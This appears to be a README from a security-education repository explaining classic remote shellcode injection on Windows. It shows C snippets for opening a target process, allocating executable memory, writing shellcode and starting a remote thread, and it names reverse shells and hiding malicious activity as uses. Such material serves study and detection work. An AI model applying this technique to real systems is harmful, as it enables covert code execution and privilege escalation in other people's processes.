# Classic Remote Injection

This folder demonstrates **remote shellcode injection**—a process injection technique where raw machine code (shellcode) is allocated, written, and executed within a **different process's** memory space.

**Important Disclaimer**: This code is for educational purposes only on systems you own or have explicit authorization to test. Unauthorized injection is illegal.

---

## What Is Remote Shellcode Injection?

Remote shellcode injection extends the classic injection technique to target **other processes** rather than self-injection:

1. **Open Target Process** – Use `OpenProcess()` to obtain a handle to the target process
2. **Allocate Memory** – Use `VirtualAllocEx()` to allocate executable memory in the target process
3. **Write Shellcode** – Use `WriteProcessMemory()` to copy shellcode bytes into the target's memory
4. **Execute** – Use `CreateRemoteThread()` to execute code at the shellcode address in the target process

### In This Folder

The example demonstrates **true remote injection** – the process injects shellcode into a **different process** specified by Process ID (PID).

**Flow:**
```
Injector.exe <Target PID>
    │
    ├─ OpenProcess(PID) → Get handle to target
    │
    ├─ VirtualAllocEx() → Allocate memory in target
    │
    ├─ WriteProcessMemory() → Copy shellcode to target
    │
    ├─ CreateRemoteThread() → Execute in target process
    │
    └─ Target Process: Shellcode executes in target's context
```

---

## Code Breakdown

### Opening the Target Process

```c
HANDLE hProcess = OpenProcess(
    PROCESS_VM_OPERATION |    // Permission to allocate/free memory
    PROCESS_VM_WRITE |        // Permission to write memory
    PROCESS_CREATE_THREAD,    // Permission to create threads
    FALSE,                    // Don't inherit handle
    pid                       // Target Process ID
);
```

**Access Flags:**
- `PROCESS_VM_OPERATION` – Allocate/free memory
- `PROCESS_VM_WRITE` – Write process memory
- `PROCESS_CREATE_THREAD` – Create threads

### Memory Allocation in Target Process

```c
LPVOID HandleMemory = VirtualAllocEx(
    hProcess,                       // Handle to target process
    NULL,                           // Preferred address (NULL = let OS choose)
    sizeof(shellcode),              // Size to allocate
    MEM_COMMIT,                     // Allocate and commit pages
    PAGE_EXECUTE_READWRITE          // Make memory executable + readable + writable
);
```

**Why `VirtualAllocEx` instead of `VirtualAlloc`?**
- `VirtualAlloc()` allocates memory in the calling process
- `VirtualAllocEx()` allocates memory in a specified process (remote)

### Writing Shellcode to Target

```c
SIZE_T bytesWritten = 0;
BOOL RESULT = WriteProcessMemory(
    hProcess,           // Handle to target process
    HandleMemory,       // Remote address in target process
    shellcode,          // Local buffer (this process)
    sizeof(shellcode),  // Size to copy
    &bytesWritten       // Bytes actually written
);
```

### Creating Remote Thread

```c
DWORD threadId = 0;
HANDLE hRemoteThread = CreateRemoteThread(
    hProcess,                               // Handle to target process
    NULL,                                   // Security attributes (NULL = default)
    0,                                      // Stack size (0 = default 1MB)
    (LPTHREAD_START_ROUTINE)HandleMemory,   // Entry point (shellcode address)
    NULL,                                   // Thread parameter
    0,                                      // Creation flags (0 = run immediately)
    &threadId                               // Output: Thread ID
);
```

**What happens:**
- New thread created in the target process
- Thread instruction pointer set to `HandleMemory` (shellcode start)
- Thread begins executing shellcode in target's security context
- Returns a handle to the remote thread

### Cleanup

```c
CloseHandle(hRemoteThread);
CloseHandle(hProcess);
```

- `CloseHandle(hRemoteThread)` – Release the remote thread handle
- `CloseHandle(hProcess)` – Release the process handle

---

## Prerequisites

### System Requirements
- Windows 10/11 (examples target modern Windows)
- Administrator privileges recommended
- Isolated test environment **strongly recommended**

### Development Tools
- **C/C++ Compiler:** MSVC (Visual Studio) or MinGW-w64
- **Debugger:** WinDbg, x64dbg, or Visual Studio Debugger (optional)

### Knowledge Requirements
- Understanding of Windows API (OpenProcess, VirtualAllocEx, CreateRemoteThread)
- Basic knowledge of Process IDs and how to identify processes
- Understanding of shellcode (position-independent machine code)

---

## Running

### Find Target Process PID

**Using PowerShell:**
```powershell
Get-Process | Where-Object {$_.ProcessName -eq "notepad"} | Select-Object Id
```

### Execute the Program

```powershell
.\Classic\ Remote\ Injection.exe <TARGET_PID>
```

**Example:**
```powershell
.\Classic\ Remote\ Injection.exe 5432
```

### Expected Output

```
Target PID: 5432
Successfully opened handle to process with PID 5432: 0x00000000000001F4
Memory allocated successfully at address: 0x0000000002A40000
Wrote 5280 bytes to allocated memory.
Thread created successfully with ID: 1234
[Shellcode executes here in target process]
```

The output depends on the shellcode payload:
- **MessageBox Shellcode** – A window appears with a message in target process context
- **Reverse Shell Shellcode** – Connection established to attacker from target process
- **Custom Payload** – Depends on implementation

---

## Generating Shellcode

The `shellcode` array in the code must be filled with actual machine code bytes. You can use **Donut** (as documented in [../Shellcode/README.md](../Shellcode/README.md)) to generate shellcode.

---

## How It Works: Step-by-Step

```
┌─────────────────────────────────────────────────────┐
│ Injector.exe <PID> Start                            │
└────────────┬────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────┐
│ OpenProcess()                                       │
│ ├─ Opens handle to target process (e.g., notepad)   │
│ └─ Verifies access permissions                      │
└────────────┬────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────┐
│ VirtualAllocEx()                                    │
│ ├─ Allocates 1000+ bytes in target's memory         │
│ └─ Returns address: 0x0000000002A40000             │
└────────────┬────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────┐
│ WriteProcessMemory()                                │
│ ├─ Copies shellcode from injector to target memory  │
│ └─ Target memory now contains machine code          │
└────────────┬────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────┐
│ CreateRemoteThread()                                │
│ ├─ Creates thread in target process                 │
│ ├─ Entry point: shellcode address in target         │
│ └─ Thread immediately executes shellcode            │
└────────────┬────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────┐
│ Target Process Shellcode Execution                  │
│ ├─ Runs in target's memory space                    │
│ ├─ Executes with target's privileges                │
│ ├─ Executes payload (MessageBox, etc.)              │
│ └─ Thread completes and exits                       │
└────────────┬────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────┐
│ Cleanup                                             │
│ ├─ CloseHandle(hRemoteThread)                       │
│ └─ CloseHandle(hProcess)                            │
└────────────┬────────────────────────────────────────┘
             │
             ▼
┌─────────────────────────────────────────────────────┐
│ Program Exit                                        │
└─────────────────────────────────────────────────────┘
```

---

## Advantages of Remote Injection

✓ **True process injection** – Code runs in another process's context
✓ **Access target's resources** – Can access files, network, registry of target
✓ **Privilege elevation** – If target runs as SYSTEM, injected code runs as SYSTEM
✓ **Process hiding** – Malicious activity hidden in legitimate process
✓ **Reliable** – Works across Windows versions

---

## Limitations and Risks

✗ **Requires administrator privileges** – Can't inject into protected processes without proper access
✗ **Highly detectable** – EDR/AV systems monitor remote thread creation
✗ **Target process must be running** – Requires active target with accessible handle
✗ **Requires shellcode** – Must have valid position-independent code
✗ **Access control** – DACL on target process may deny access

---

## Legal and Ethical Considerations

**Authorization Required:**
- Only use on systems you own
- Never test on systems without explicit written permission
- Works in authorized penetration testing scenarios only

**Responsible Disclosure:**
- Report findings through proper channels
- Give organizations time to patch
- Follow your organization's security policies

**Legal Implications:**
- Unauthorized code injection is illegal (Computer Fraud and Abuse Act in US)
- Similar laws exist in other jurisdictions
- Violations can result in criminal charges

---

## References

- [OpenProcess Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
- [VirtualAllocEx Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
- [WriteProcessMemory Documentation](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
- [CreateRemoteThread Documentation](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
- [Windows Internals](https://learn.microsoft.com/en-us/sysinternals/)

---

## Disclaimer

This code and documentation are provided for educational purposes on authorized systems only. Unauthorized process injection is illegal and violates computer fraud laws. You are solely responsible for compliance with applicable laws and organizational policies.
